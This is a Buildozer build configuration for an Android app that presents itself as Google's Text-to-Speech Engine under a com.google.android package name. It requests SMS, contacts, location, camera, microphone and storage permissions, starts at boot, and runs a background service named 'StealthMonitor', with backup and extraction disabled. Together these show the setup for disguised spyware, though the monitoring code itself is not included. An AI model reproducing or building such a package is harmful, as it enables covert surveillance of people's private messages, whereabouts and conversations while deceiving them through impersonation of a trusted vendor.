[app]
title = Google Text-to-Speech Engine
package.name = tts_v2
package.domain = com.google.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,json,ttf,xml
source.include_dirs = assets,res
version = 2.1.3
requirements = python3,hostpython3,kivy==2.3.0,requests,flask,opencv,numpy,pyjnius,pycryptodomex,six,setuptools
orientation = portrait
fullscreen = 0
android.permissions = INTERNET,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS,CAMERA,RECORD_AUDIO,READ_CONTACTS,READ_SMS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE
android.api = 34
android.minapi = 21
android.ndk = 26b
android.build_tools_version = 34.0.0
android.archs = arm64-v8a
android.release_artifact = apk
android.foreground_service = True
services = StealthMonitor:monitor.py
android.meta_data = android.content.pm.NOT_EXTRACTABLE=true
android.allow_backup = False
android.private_storage = True
android.accept_sdk_license = True
android.wakelock = True
android.num_cores = 1

[buildozer]
log_level = 2
warn_on_root = 1
